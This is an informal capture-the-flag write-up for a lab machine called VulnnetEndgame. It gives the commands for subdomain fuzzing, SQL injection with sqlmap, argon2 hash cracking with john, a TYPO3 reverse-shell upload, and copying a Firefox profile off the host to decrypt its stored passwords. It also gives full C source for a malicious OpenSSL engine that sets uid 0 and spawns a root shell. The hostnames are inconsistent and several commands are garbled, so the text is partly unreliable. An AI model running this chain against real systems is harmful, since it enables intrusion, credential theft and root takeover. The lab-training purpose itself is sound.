VulnnetEndgame

First of all we add the ip address 10.10.2.42 to the /etc/hosts:

	sudo nano /etc/hosts
	10.10.2.42   vulnneth.thm

after that we started nmap and gobuster but we had a few results, the challenge remind us that the enum is the key, so we musit search forn subdomains, and it's time fo wfuzz:

	wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://vulnnet.thh -H "Host:FUZZ.vulnneth.thm" --hw 9 (--hw we filter by word)

from the previous enumeration we get 3 subdomain api. blog. admin1. so we enter this subdomain at /etc/hosts and we surf on it.
The most interesting it's blog after watched one of this post in the network section of inspection there is something linked to api, and more specific with an sql injection, so we run sqlmap.

	sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5
	sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5 --all

now we have the all database records, it's time to check it.
from the records we obtain a list of username and password, and the hash of the password in argon2, so with sublime, we have created a password list and then it's time to use john:

 	john argon.hash -w=./password.txt
	
we obtain the credentials of the admin chris_w, we go straight to the login admin page in /typo3/index.php
it's time to do a revshell in order to achieve it we must turn off the extensions controlls and then upload the revshell
(NB start pwncat) 

now we're in the server by listing the directories, there is something strange a directory configuration of firefox and a normal user can access it, so by google it some exploit, we found it
a script to decrypt the password by entering a file of a general firefox settings so we proceed it this way:

	zip -r /tmp/2fjnrwth.default-release 2fjnrwth.default-release
	cd /tmp
	python3 -m http.server
	wget http://10.10.2.42:8000/2fjnrwth.default-release (in the host machine)
	python3 firefox-decrypt.py 2fjnrwth.default-release

and now we obtain the credentials of system account of user.txt, by running linpeas.sh we see that openssl had some capabilities so we check for some exploits, and we found it some interesting written in c.

	sudo apt install libssl-dev

	#include <openssl/engine.h>

	static int bind(ENGINE *e, const char *id) {
   	 setuid(0); setgid(0);
    	system("/bin/bash");
	}

	IMPLEMENT_DYNAMIC_BIND_FN(bind)
	IMPLEMENT_DYNAMIC_CHECK_FN()

	gcc -fPIC -o exploit.o -c exploit.c
	gcc -shared -o exploit.so -lcrypto exploit.o 

in practical we have created a fake shared object library, finally we import it on the machine to exploit and we run this command

	/home/system/Utilis/openssl openssl req -engine ./exploit.so --> with this command we try to create with the .so library a certificate but instead we did a privescaltion

it's time to get the third flag.
